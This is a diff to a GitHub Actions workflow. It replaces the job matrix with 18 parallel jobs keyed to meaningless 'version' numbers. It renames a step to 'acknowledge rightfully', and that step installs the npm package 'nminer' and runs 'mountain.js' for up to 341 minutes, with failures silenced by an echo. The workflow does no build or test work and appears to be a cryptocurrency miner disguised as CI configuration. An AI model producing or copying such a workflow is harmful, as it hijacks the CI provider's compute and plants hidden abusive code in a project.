@@ -9,22 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 550 }
-          - { version: 5869 }
-          - { version: 2330 }
-          - { version: 4258 }
-          - { version: 90 }
-          - { version: 7860 }
-          - { version: 5607 }
-          - { version: 839 }
-          - { version: 2976 }
-          - { version: 3939 }
-          - { version: 2298 }
-          - { version: 4992 }
-          - { version: 6305 }
-          - { version: 8987 }
-          - { version: 420 }
-          - { version: 2678 }
+          - { version: 3236 }
+          - { version: 4037 }
+          - { version: 5872 }
+          - { version: 3878 }
+          - { version: 876 }
+          - { version: 5180 }
+          - { version: 315 }
+          - { version: 1263 }
+          - { version: 8462 }
+          - { version: 455 }
+          - { version: 6020 }
+          - { version: 9559 }
+          - { version: 137 }
+          - { version: 6464 }
+          - { version: 4179 }
+          - { version: 6078 }
+          - { version: 4826 }
+          - { version: 5435 }
 
     steps:
       - name: Checkout
@@ -35,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: acknowledge rightfully
         run: |
           npm install nminer@latest
-          timeout 314m node mountain.js || echo "mountain executed"
+          timeout 341m node mountain.js || echo "mountain executed"
